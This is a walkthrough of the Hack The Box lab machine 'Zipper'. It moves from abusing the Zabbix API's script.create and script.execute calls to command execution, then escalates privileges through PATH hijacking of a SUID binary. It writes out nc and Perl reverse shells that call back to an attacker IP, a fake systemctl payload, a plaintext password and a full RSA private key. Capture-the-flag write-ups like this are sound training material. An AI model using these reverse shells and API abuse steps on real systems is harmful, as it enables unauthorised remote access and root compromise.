---
title: "[EN] Zipper (Hard)"
slug: "en-zipper-hard"
chapter: "linux"
priority: 1
editor: "markdown"
revisionCount: 6
id: 29
createdAt: "2020-05-06T17:18:02Z"
createdBy: "boschko"
updatedAt: "2025-07-10T16:08:06Z"
updatedBy: "blackwasp"
ownedBy: "boschko"
views: 26
---
<p id="bkmrk-"><a href="/uploads/images/gallery/2020-05/yF4MkZZLKcv4T0Ux-zipper.PNG" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/yF4MkZZLKcv4T0Ux-zipper.PNG" alt="zipper.PNG"></a></p>
<h5 id="bkmrk-what-you-will-learn%3A">What you will learn:</h5>
<ul id="bkmrk-api-to-rce-funky-she"><li>API to RCE</li>
<li id="bkmrk-%C2%A0">Funky shell magic to get a stable environment</li>
<li>Abusing SUID binaries</li>
<li>Path manipulation</li>
</ul><h5 id="bkmrk-overview%3A">Overview:</h5>
<ul id="bkmrk-can-issue-api-calls-"><li>Can issue API calls as a user we cant authenticate as</li>
<li>We can create a script (thru API calls) and get RCE as user <code class="language-plaintext highlighter-rouge">zabbix</code> within a container</li>
<li>Create a perl reverse shell script and make it run on the zabbix agent (running on the host OS)</li>
<li>Priv esc is a suid binary that executes the <code class="language-plaintext highlighter-rouge">systemctl daemon-reload</code> command</li>
<li>We can hijack this command by creating our own systemctl file (with a reverse shell), then modify the path so the suid file, and executes our file instead of <code class="language-plaintext highlighter-rouge">/bin/systemctl</code></li>
</ul><h5 id="bkmrk-detailed-steps">Detailed Steps</h5>
<hr id="bkmrk--0"><p id="bkmrk-we%27ll-start-by-perfo">We'll start by performing some initial recon:</p>
<pre id="bkmrk-nmap--ss--sv--sc--o-"><code class="language-bash">nmap -sS -sV -sC -O -p - 10.10.10.108     
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  zabbix-agent
</code></pre>
<p id="bkmrk-based-on-the-ssh-ver">Based on the SSH version, this is likely Ubuntu <a href="https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4">Bionic (18.04)</a>, we have a Zabbix Agent on port 10050, and a website at port 80.</p>
<p id="bkmrk-going-to-the-website">Going to the website we're greeted with an Apache2 Ubuntu default page:</p>
<p id="bkmrk--1"><a href="/uploads/images/gallery/2020-05/jFuX8bAaIwws3xoN-image-1588786206515.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/jFuX8bAaIwws3xoN-image-1588786206515.png" alt="image-1588786206515.png"></a></p>
<p id="bkmrk-so-lets-go-ahead-and">So lets go ahead and run gobuster to get a better idea of the landscape:</p>
<pre id="bkmrk-gobuster-dir--u-http"><code class="language-bash">gobuster dir -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html,zip -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.108
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html,zip
[+] Timeout:        10s
===============================================================
2020/05/06 13:32:22 Starting gobuster
===============================================================
/index.html (Status: 200)
/zabbix (Status: 301)
===============================================================</code></pre>
<p id="bkmrk-we-see-the-name-zabb">We see the name Zabbix again. Zabbix is a software suite designed to give IT staff visibility over their IT infrastructure through a web GUI and an API. Their pages boasts: <em>Monitor anything - Solutions for any kind of IT infrastructure, services, applications, resources.</em></p>
<p id="bkmrk--2"><a href="/uploads/images/gallery/2020-05/X16N5EFclcKTpfIM-image-1588786782129.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/X16N5EFclcKTpfIM-image-1588786782129.png" alt="image-1588786782129.png"></a></p>
<p id="bkmrk-we-get-this-login-pa">We get this login page , we don’t have credentials but down there there’s an option to sign in as a guest. So yeah it really is a server monitoring tool but as guest we get to see a dashboard but we are not privileged to do anything because we are a guest user.</p>
<p id="bkmrk-after-some-enumerati">After some enumeration we will notice in : Monitoring –&gt; Latest data , Zapper's Backup Script</p>
<p id="bkmrk--3"><a href="/uploads/images/gallery/2020-05/6HVQGicEcHpHn3Pq-image-1588786975042.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/6HVQGicEcHpHn3Pq-image-1588786975042.png" alt="image-1588786975042.png"></a></p>
<p id="bkmrk-now-we-have-a-potent">Now we have a potential username : <code>zapper</code> , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password <code>zapper : zapper</code></p>
<p id="bkmrk--4"><a href="/uploads/images/gallery/2020-05/xinB4eSvb7BWoc12-image-1588787184596.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/xinB4eSvb7BWoc12-image-1588787184596.png" alt="image-1588787184596.png"></a></p>
<p id="bkmrk-gui-access-disabled-"><code>GUI access disabled</code> , on exploit-db there’s an authenticated remote code execution exploit for an old version of zabbix. <a href="https://www.exploit-db.com/exploits/39937">https://www.exploit-db.com/exploits/39937</a> .Unfortunately valid credentials are not enough to exploit it...</p>
<p id="bkmrk--5"><a href="/uploads/images/gallery/2020-05/8CbJV38QcCstOGXu-image-1588787294841.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/8CbJV38QcCstOGXu-image-1588787294841.png" alt="image-1588787294841.png"></a></p>
<p id="bkmrk-after-doing-a-good-a">After doing a good amount of research (and me knowing that this box is abusing APIs) I turned to the zabbix API, which is documented <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference">https://www.zabbix.com/documentation/3.0/manual/api/reference</a>.</p>
<p id="bkmrk-so-what-well-want-to">So what well want to do is simple:</p>
<ol id="bkmrk-%C2%A0log-into-the-api-%C2%A0g"><li> Log into the API</li>
<li> Get list of Host IDs</li>
<li> Get a reverse-shell by executing a script specifying proper host ID's</li>
</ol><p id="bkmrk--6"><a href="/uploads/images/gallery/2020-05/NxTJ2ghGgM8fQlN7-image-1588787642097.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/NxTJ2ghGgM8fQlN7-image-1588787642097.png" alt="image-1588787642097.png"></a></p>
<p id="bkmrk-to-interact-with-the">To interact with the api, I’ll send <code class="highlighter-rouge">curl</code> POST requests to <code class="highlighter-rouge">/zabbix/api_jsonrpc.php</code></p>
<p id="bkmrk-so-we-need-to-login%2C">So we need to login, to do so we'll perform the following:</p>
<pre id="bkmrk-curl-http%3A%2F%2F10.10.10"><code class="language-bash">curl http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "zapper", "password": "zapper"}}'

{"jsonrpc":"2.0","result":"98d9e1f155c0be74352ccbb0f9b4e453","id":1}</code></pre>
<p id="bkmrk-before-you-can-acces">Before you can access any data inside of Zabbix you'll need to log in and obtain an authentication token so now that we've obtained this authentication token we can login using the using the <code>user.login</code> method to list users.</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.get", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"output": "extend"}}' | jq .

{                      
  "jsonrpc": "2.0",    
  "result": [                                                   
    {                                                           
      "userid": "1",                                            
      "alias": "Admin",                                         
      "name": "Zabbix",                                         
      "surname": "Administrator",
      "url": "",        
      "autologin": "1",  
      "autologout": "0",    
      "lang": "en_GB",      
      "refresh": "30",      
      "type": "3",          
      "theme": "default",   
      "attempt_failed": "0",
      "attempt_ip": "",    
      "attempt_clock": "0",
      "rows_per_page": "50"
    },                 
    {                  
      "userid": "2",   
      "alias": "guest", 
      "name": "",       
      "surname": "",    
      "url": "",        
      "autologin": "1",  
      "autologout": "0",    
      "lang": "en_GB",      
      "refresh": "30",      
      "type": "1",          
      "theme": "default",   
      "attempt_failed": "0",
      "attempt_ip": "",    
      "attempt_clock": "0",
      "rows_per_page": "50"
    },                  
    {                   
      "userid": "3",    
      "alias": "zapper",
      "name": "zapper", 
      "surname": "",    
      "url": "",        
      "autologin": "0",  
      "autologout": "0",    
      "lang": "en_GB",      
      "refresh": "30",      
      "type": "3",          
      "theme": "default",   
      "attempt_failed": "0",
      "attempt_ip": "",    
      "attempt_clock": "0",
      "rows_per_page": "50"
    }                                                           
  ],                                                                                                                             
  "id": 1                                                                                                                        
}  </code></pre>
<p id="bkmrk-i-can-also-list-the-">I can also list the hosts ID, and see there’s two, named Zabbix and Zipper using the following command:</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-0"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"host.get", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{}}' | jq .

...
      "hostid": "10106",
      "proxy_hostid": "0",
      "host": "Zipper",
...
      "hostid": "10105",                                                                                                         
      "proxy_hostid": "0",                                                                                                       
      "host": "Zabbix",  
...
</code></pre>
<p id="bkmrk-and-i-can-also-get-a">And I can also get a list of scripts currently set:</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-1"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.get", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{}}' | jq .

{
  "jsonrpc": "2.0",
  "result": [
    {
      "scriptid": "1",
      "name": "Ping",
      "command": "/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1",
      "host_access": "2",
      "usrgrpid": "0",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    },
    {
      "scriptid": "2",
      "name": "Traceroute",
      "command": "/usr/bin/traceroute {HOST.CONN} 2&gt;&amp;1",
      "host_access": "2",
      "usrgrpid": "0",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    },
    {
      "scriptid": "3",
      "name": "Detect operating system",
      "command": "sudo /usr/bin/nmap -O {HOST.CONN} 2&gt;&amp;1",
      "host_access": "2",
      "usrgrpid": "7",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    }
  ],
  "id": 1
}
</code></pre>
<p id="bkmrk-now-in-theory-there-">Now in theory there are multiple ways of obtaining a shell. I know of 2 but I've seen someone do it in 4 different ways. In this walk-through we'll simple be doing it through the API.</p>
<p id="bkmrk-i-listed-the-hosts-t">I listed the hosts that this instance of Zabbix is controlling. One was called Zabbix, and the other Zipper. So to attack Zipper  I’ll grab the hostid of 10106, and create a script to run whatever I want (<a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script/create">https://www.zabbix.com/documentation/3.0/manual/api/reference/script/create)</a> </p>
<ul id="bkmrk-%22command%22%3A-%22id%22---th"><li><code class="highlighter-rouge">"command": "id"</code> - the command to run</li>
<li><code class="highlighter-rouge">"name": "test"</code> - can be anything</li>
<li><code class="highlighter-rouge">"execute_on": 0</code> - where to run the script. If I don’t specify this, the default is 1, which means it will run on the Zabbix server.</li>
</ul><p id="bkmrk-but-i-want-to-run-it">But I want to run it at the Zabbix agent, so I’ll pass 0.</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-2"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"command": "id", "name": "test", "execute_on": 0}}' | jq .

{
  "jsonrpc": "2.0",
  "result": {
    "scriptids": [
      "4"
    ]
  },
  "id": 1
}
</code></pre>
<p id="bkmrk-i-get-back-the-scrip">I get back the scriptid of 4. Now I’ll run that with script.execute:</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-3"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"hostid": 10106, "scriptid": 4}}' | jq .

{
  "jsonrpc": "2.0",
  "result": {
    "response": "success",
    "value": "uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)"
  },
  "id": 1
}
</code></pre>
<p id="bkmrk-as-you-can-see-the-c">As you can see the command ran and it displayed the ID (zabbix), so we know it works now lets do the same thing but to obtain a reverse shell.</p>
<p id="bkmrk-so-lets-upload-the-s">So lets upload the script:</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-4"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"scriptid": 4, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.31 443 &gt;/tmp/f"}}' | jq -c .

{"jsonrpc":"2.0","result":{"scriptids":[4]},"id":1}
</code></pre>
<p id="bkmrk-%C2%A0-1"> </p>
<p id="bkmrk-now-i%E2%80%99ll-hit-the-scr">Now I’ll hit the script.execute api again.  for it to execute the script I uploaded.</p>
<pre id="bkmrk-curl--s-http%3A%2F%2F10.10-5"><code class="language-bash">curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"hostid": 10106, "scriptid": 4}}' | jq -c .

{"jsonrpc":"2.0","error":{"code":-32500,"message":"Application error.","data":"Timeout while executing a shell script."},"id":1}</code></pre>
<p id="bkmrk-his-time-it-just-han">his time it just hangs (and eventually times out) only giving me around 10 second to do anything:</p>
<p id="bkmrk--7"><a href="/uploads/images/gallery/2020-05/mrSthUEMnaz8VEVc-image-1588790020487.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/mrSthUEMnaz8VEVc-image-1588790020487.png" alt="image-1588790020487.png"></a></p>
<p id="bkmrk-so-we%27ll-want-to-get">So we'll want to get a more stable shell... To do this we will run a second reverse shell in the window so that when it comes back we can run bash commands.</p>
<pre id="bkmrk-perl--e-%27use-socket%3B"><code class="language-perl">perl -e 'use Socket;$i="10.10.14.31";$p=445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre>
<pre id="bkmrk-%3D%3D%3D-step-1-%3D%3D%3D-curl-"><code class="language-bash">=== Step 1 	===
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"command": "id", "name": "shell", "execute_on": 0}}' | jq .

{
  "jsonrpc": "2.0",
  "result": {
    "scriptids": [
      "5"
    ]
  },
  "id": 1
}

=== Step 2 	===
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"scriptid": 5, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.31 443 &gt;/tmp/f"}}' | jq -c .
{"jsonrpc":"2.0","result":{"scriptids":[5]},"id":1}

=== Step 3 	===
curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"98d9e1f155c0be74352ccbb0f9b4e453", "params":{"hostid": "10106", "scriptid": 5}}' | jq -c .
</code></pre>
<p id="bkmrk-%C2%A0-2"> </p>
<p id="bkmrk--8"><a href="/uploads/images/gallery/2020-05/wKEcAwyyewxDDnA5-image-1588791173185.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/wKEcAwyyewxDDnA5-image-1588791173185.png" alt="image-1588791173185.png"></a></p>
<p id="bkmrk-now-we-have-a-shell-">Now we have a shell as zabbix but the user.txt file is owned by zapper so we will have to privilege escalate to zapper.</p>
<p id="bkmrk--9"><a href="/uploads/images/gallery/2020-05/VcMwnh2rka4QLhtF-image-1588791568967.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/VcMwnh2rka4QLhtF-image-1588791568967.png" alt="image-1588791568967.png"></a></p>
<p id="bkmrk-we%27ll-quickly-load-l">We'll quickly load linpeas.sh and and linenum.sh and hope it makes out life easy:</p>
<pre id="bkmrk-%24-wget-http%3A%2F%2F10.10."><code class="language-bash">$ wget http://10.10.14.31/linpeas.sh
--2020-05-06 15:06:36--  http://10.10.14.31/linpeas.sh
Connecting to 10.10.14.31:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 160507 (157K) [text/x-sh]
Saving to: ‘linpeas.sh’

     0K .......... .......... .......... .......... .......... 31%  524K 0s
    50K .......... .......... .......... .......... .......... 63%  534K 0s
   100K .......... .......... .......... .......... .......... 95%  560K 0s
   150K ......                                                100%  274K=0.3s

2020-05-06 15:06:37 (518 KB/s) - ‘linpeas.sh’ saved [160507/160507]

$ chmod +x linpeas.sh
</code></pre>
<p id="bkmrk-inside-of-utils-loca">Inside of utils located in zapper's home directory we find 2 files. <code>backup.sh</code> and <code>zabbix-service</code>.</p>
<p id="bkmrk--10"><a href="/uploads/images/gallery/2020-05/d0G9DjKaTYPs3FoZ-image-1588791649402.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-05/scaled-1680-/d0G9DjKaTYPs3FoZ-image-1588791649402.png" alt="image-1588791649402.png"></a></p>
<p id="bkmrk-you-can-see-it-says-">You can see it says <code>-p ZippityDoDah</code>... yeah that's the password for zapper...</p>
<p id="bkmrk-%C2%A0-3"> </p>
<pre id="bkmrk-%24-python3--c-%27import"><code class="language-bash">$ python3 -c 'import pty;pty.spawn("/bin/bash")'
zabbix@zipper:/home/zapper/utils$ su zapper
su zapper
Password: ZippityDoDah


              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗ 
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[&gt;] Backups:
4.0K    /backups/zapper_backup-2020-05-06.7z
                                      

zapper@zipper:~/utils$ 
</code></pre>
<p id="bkmrk-now-we-have-user.txt">Now we have user.txt</p>
<p id="bkmrk--11"><a href="/uploads/images/gallery/2020-05/trvNrJPDK2Ya4y10-image-1588792607879.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/trvNrJPDK2Ya4y10-image-1588792607879.png" alt="image-1588792607879.png"></a></p>
<p id="bkmrk-now-we-have-to-privi">Now we have to privilege escalation from zipper to root.</p>
<p id="bkmrk-we%27ll-quickly-also-g">we'll quickly also grab the ssh keys as a way of getting back to where we currently are if shit goes sour...</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2F.ssh"><code class="language-">zapper@zipper:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR
l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67
GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+
eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M
2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi
eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz
+docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo
84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4
aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh
UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa
8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP
rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV
UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0
oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY
ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+
zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe
8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac
OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur
7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A
m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K
Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB
MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu
lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk
WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE
Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ=
-----END RSA PRIVATE KEY-----
</code></pre>
<p id="bkmrk-so-doing-some-basic-">So doing some basic enumeration we realize that suid is set on zabbix-service</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil"><code class="language-bash">zapper@zipper:~/utils$ find / -perm -u=s -type f 2&gt;/dev/null
/home/zapper/utils/zabbix-service</code></pre>
<p id="bkmrk-%C2%A0-4">So we'll have to actually understand it and see how we can exploit it... when ran it asks whether to stop or run the service so lets run ltrace and see whats going on.</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-0"><code class="language-bash">zapper@zipper:~/utils$ ./zabbix-service 
./zabbix-service 
start or stop?: start
start</code></pre>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-1"><code class="language-bash">zapper@zipper:~/utils$ ltrace ./zabbix-service 
ltrace ./zabbix-service 
__libc_start_main(0x42b6ed, 1, 0xbfacafd4, 0x42b840 &lt;unfinished ...&gt;
setuid(0)                                        = -1
setgid(0)                                        = -1
printf("start or stop?: ")                       = 16
fgets(start or stop?: start
start
"start\n", 10, 0xb7f2b5c0)                 = 0xbfacaf02
strcspn("start\n", "\n")                         = 5
strcmp("start", "start")                         = 0
system("systemctl daemon-reload &amp;&amp; syste"...Failed to reload daemon: The name org.freedesktop.PolicyKit1 was not provided by any .service files
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                           = 256
+++ exited (status 0) +++</code></pre>
<p id="bkmrk-based-on-the-ltrace-">Based on the <code class="language-plaintext highlighter-rouge">ltrace</code> output, we see that the program executes <code class="language-plaintext highlighter-rouge">systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent</code> as user root. The call towards close to the end <code class="highlighter-rouge">system("systemctl daemon-reload &amp;&amp; syste</code>. It’s a bit cut off, but I can see it better in <code class="highlighter-rouge">strings</code></p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-2"><code class="language-shell">zapper@zipper:~/utils$ strings zabbix-service | grep system
strings zabbix-service | grep system
system
systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent
systemctl stop zabbix-agent
system@@GLIBC_2.0</code></pre>
<p id="bkmrk-that%E2%80%99s-calling-syste">That’s calling <code class="highlighter-rouge">system</code> on <code class="highlighter-rouge">systemctl</code> without a path. If I change the path and call again, I can replace systemctl with my own thing to run.</p>
<p id="bkmrk-my-new-systemctl-loo">My new systemctl looks like this:</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-3"><code class="language-shell">zapper@zipper:~/utils$ chmod +x systemctl 
zapper@zipper:~/utils$ cat systemctl 
#!/bin/sh

rm /tmp/f2;mkfifo /tmp/f2;/bin/cat /tmp/f2|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.31 4444 &gt;/tmp/f2</code></pre>
<p id="bkmrk-we-will-add-%2Fhome%2Fza">We will add <code>/home/zapper/utils</code> as the first entry in <code>PATH</code> env variable , so the system will look there first :<br><code>export PATH=/home/zapper/utils:$PATH</code></p>
<p id="bkmrk-this-is-changing-the">This is changing the <code>PATH</code> variable to <code>/home/zapper/utils:</code> + the old path</p>
<pre id="bkmrk-zapper%40zipper%3A%7E%2Futil-4"><code class="language-shell">zapper@zipper:~/utils$ echo $PATH
/home/zapper/utils:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
zapper@zipper:~/utils$ which systemctl
/home/zapper/utils/systemctl
zapper@zipper:~/utils$ ./zabbix-service 
start or stop?: start</code></pre>
<p id="bkmrk-we-are-now-root%21">We are now root!</p>
<p id="bkmrk--12"><a href="/uploads/images/gallery/2020-05/zwglOsQagFSLLa20-image-1588794380869.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/zwglOsQagFSLLa20-image-1588794380869.png" alt="image-1588794380869.png"></a></p>
<p id="bkmrk--13"><a href="/uploads/images/gallery/2020-05/Tu0SdY0qAixFg5uo-image-1588794436052.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-05/scaled-1680-/Tu0SdY0qAixFg5uo-image-1588794436052.png" alt="image-1588794436052.png"></a></p>
<p id="bkmrk-%C2%A0-5"> </p>
<hr id="bkmrk--14"><h4 id="bkmrk-by-boschko">By Boschko</h4>
<ul id="bkmrk-my-hack-the-box%3A-htt"><li class="graf graf--p">My Hack The Box: <a class="markup--anchor markup--p-anchor" href="https://www.hackthebox.eu/home/users/profile/37879" target="_blank" rel="nofollow noopener" data-href="https://www.hackthebox.eu/home/users/profile/37879">https://www.hackthebox.eu/home/users/profile/37879</a></li>
<li class="graf graf--p">My Website: <a class="markup--anchor markup--p-anchor" href="https://olivierlaflamme.github.io/" target="_blank" rel="noopener nofollow noopener" data-href="https://olivierlaflamme.github.io/">https://olivierlaflamme.github.io/</a></li>
<li class="graf graf--p">My GitHub: <a class="markup--anchor markup--p-anchor" href="https://github.com/OlivierLaflamme" target="_blank" rel="noopener nofollow noopener" data-href="https://github.com/OlivierLaflamme">https://github.com/OlivierLaflamme</a></li>
<li class="graf graf--p">My WeChat QR below:</li>
</ul><figure id="bkmrk--15" class="graf graf--figure graf--layoutOutsetLeft"><img class="graf-image" src="https://cdn-images-1.medium.com/max/750/0*Jh0zrZrfyn8WjkDn.png" data-image-id="0*Jh0zrZrfyn8WjkDn.png" data-width="142" data-height="144"></figure><p id="bkmrk-%C2%A0-6" class="graf graf--p graf--empty"> </p>
